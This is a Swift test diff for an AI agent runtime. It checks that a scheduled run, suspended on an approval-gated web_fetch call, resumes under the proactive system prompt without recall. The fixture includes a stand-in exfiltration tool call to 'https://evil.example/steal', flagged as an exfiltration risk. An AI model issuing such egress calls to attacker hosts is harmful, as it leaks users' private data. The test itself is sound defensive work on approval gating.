@@ -25,11 +25,13 @@ actor StubLLMProvider: LLMProvider {
 
   private let outcome: Outcome
   private(set) var callCount = 0
+  private(set) var requests: [ChatRequest] = []
 
   init(_ outcome: Outcome) { self.outcome = outcome }
 
   func complete(request: ChatRequest) async throws -> ChatResponse {
     callCount += 1
+    requests.append(request)
     switch outcome {
     case .respond(let response): return response
     case .fail(let error): throw error
@@ -1172,6 +1174,104 @@ private func okResponse(content: String) -> ChatResponse {
     let counts = try heartbeatAuditCounts(env.queue)
     #expect(counts.suppressed == 0)
     #expect(counts.fired == 0)
+  }
+
+  @Test func scheduledRunResumesUnderTheProactivePromptWithoutRecall() async throws {
+    // given — a scheduled-origin run suspended on a gated fetch, its partial exchange persisted
+    // through the real store choreography an approval resume replays (commit → claim → fill)
+    let fixedNow = Date(timeIntervalSince1970: 1_700_000_000)
+    let env = try makeEnv(
+      agentOutcome: .respond(okResponse(content: "Fetched and summarized.")),
+      now: { fixedNow }
+    )
+    let runs = RunStoreGRDB(writer: env.queue)
+    _ = try #require(try runs.pickUp(runId: env.runId, policyVersion: nil, now: fixedNow))
+    try await env.queue.write { db in
+      try db.execute(
+        sql: "UPDATE runs SET origin = 'scheduled' WHERE id = ?",
+        arguments: [env.runId]
+      )
+    }
+    let receipt = try runs.commitSuspendedTurn(
+      runId: env.runId,
+      sessionId: env.sessionId,
+      commit: SuspendedTurnCommit(
+        assistantContent: "",
+        toolCallsJSON: #"[{"id":"f1","name":"web_fetch","arguments":"{}"}]"#,
+        completedObservations: [],
+        pending: PendingToolAction(
+          toolCallId: "f1",
+          recorded: RecordedToolAction(
+            tool: "web_fetch",
+            canonicalArgsJSON: #"{"url":"https://evil.example/steal"}"#,
+            argsHash: "hash",
+            canonicalTarget: "https://evil.example/steal",
+            reason: .exfilTrifecta,
+            presentation: ToolApprovalPresentation(
+              blastRadius: "egress to evil.example",
+              contentPreview: nil,
+              warnings: []
+            )
+          )
+        ),
+        ownerUserId: env.chatId,
+        nonce: ApprovalNonce.generate(),
+        promptChunks: [],
+        setTainted: true,
+        setPrivateData: true,
+        expiresTs: fixedNow.addingTimeInterval(3_600)
+      ),
+      now: fixedNow
+    )
+
+    // when — the owner's approval claims and fills the observation, then the run resumes
+    let claim = try runs.claimApprovedExecution(
+      runId: env.runId,
+      observationMessageId: receipt.observationMessageId,
+      notResumableObservationContent: "stopped",
+      now: fixedNow
+    )
+    #expect(claim == .committed)
+    try runs.fillClaimedObservation(
+      runId: env.runId,
+      observationMessageId: receipt.observationMessageId,
+      fill: ClaimedObservationFill(
+        content: "the fetched page body",
+        status: .ok,
+        setTainted: true,
+        setPrivateData: false,
+        audit: ApprovedExecutionAudit(
+          tool: "web_fetch",
+          argsRedacted: #"{"url":"https://evil.example/steal"}"#
+        ),
+        now: fixedNow
+      )
+    )
+    await env.runner.resume(
+      runId: env.runId,
+      sessionId: env.sessionId,
+      chatId: env.chatId,
+      contextBoundMessageId: receipt.observationMessageId
+    )
+
+    // then — the resume assembled under the proactive prompt (no /schedule token), replayed THIS
+    // run's partial exchange (a .tool-role message), and skipped recall
+    #expect(try latestRunState(env.queue) == RunState.done.rawValue)
+    let resumeRequest = try #require(await env.provider.requests.last)
+    let resumeSystem = try #require(resumeRequest.messages.first?.content)
+    #expect(resumeRequest.messages.first?.role == .system)
+    #expect(resumeSystem.contains("started by your own scheduler"))
+    #expect(resumeSystem.contains("/schedule") == false)
+    #expect(
+      resumeRequest.messages.contains { message in
+        message.role == .tool
+      }
+    )
+    #expect(
+      resumeRequest.messages.contains { message in
+        message.content.contains("label=\"recall\"")
+      } == false
+    )
   }
 
   private func heartbeatAuditCounts(
